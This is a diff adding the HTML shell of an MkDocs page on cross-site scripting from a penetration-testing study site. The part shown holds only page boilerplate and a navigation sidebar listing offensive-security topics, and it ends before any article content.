@@ -1,0 +1,4954 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../sql-injection/">
+      
+      
+        <link rel="next" href="../../Windows/1-priv-esc/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>Cross-Site Scripting (XSS) - OSCP Prep Mastery</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#cross-site-scripting-xss" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="OSCP Prep Mastery" class="md-header__button md-logo" aria-label="OSCP Prep Mastery" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OSCP Prep Mastery
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cross-Site Scripting (XSS)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="OSCP Prep Mastery" class="md-nav__button md-logo" aria-label="OSCP Prep Mastery" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    OSCP Prep Mastery
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Welcome to MkDocs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exiftool/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exiftool
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../exploit-helper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Helpul things for public exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../helpfull-tips/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SSH with commandline enable
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../init-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inital Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ligolo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ligolo-ng Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../takeaway/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Takeaway From the reports I found
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tmux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tmux Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    AD
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            AD
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/AD-Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active Directory Reconnaissance
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/add-user-to-group/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Change User Groups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/bloodhound/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bloodhound Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/data-issues/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sync Date with DC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/dcsync/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DCSync Attack
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/force-change-password/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Force Change Password
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/generate-ntlm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Generate NTLM Hash
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/gpo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Abuse Windows GPO
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/inital-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inital Enumration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/ldap-queries/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LDAP Queries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/ntlm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NTLM Relay Attack
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/smb-hash-theft/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grab Hash using NTLM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Exploits
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            Exploits
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Exploits/search/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exploit Search Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/1-priv-esc-methodology-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Privilege Escalation Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priv Esc Docker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/linux-priv-esc-permissions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Priv Esc Though Permissions
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/linux-priv-esc-python/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priviledge Escalation Using Python
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/network/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/passwd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write to /etc/passwd
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/reverse-shell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux SMB Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/using-curl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage of curl
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/using-tcpdump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Using tcpdump
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            Network Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/Linux-Priv-Esc-Process/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priviledge Escalation though process
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/ftp-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FTP Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/nmap-scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nmap Scanning 🗺️
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/snmp-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SNMP Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Other Resources Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            Other Resources Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Other%20Resources%20Notes/linux-priv-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Priv Esc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Other%20Resources%20Notes/windows-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Password Fuzzing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            Password Fuzzing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/default-passwords/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Default Passwords
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/emum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Password Guessing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-hashcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hashcat Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-hydra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hydra Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage Of John
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/using-burp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Use Burp Intruder
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/web-passwords/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzz Webapplication Password Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+        
+          
+          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ports & Applications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_15">
+            <span class="md-nav__icon md-icon"></span>
+            Ports & Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/git/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Git Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/laravel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Laravel Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-111-portmapper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 111 - Portmapper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-113/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 113 - Ident
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-161-snmp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SNMP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-21-ftp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 21: Fuzzing FTP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-22-ssh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 22 - SSH
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-25-smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SMTP Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-3128-squid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 3128: Fuzzing Squid Proxy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-3389-rdp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 3389 RDP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-445-smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing SMB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-49152-rpcclient/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RPC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
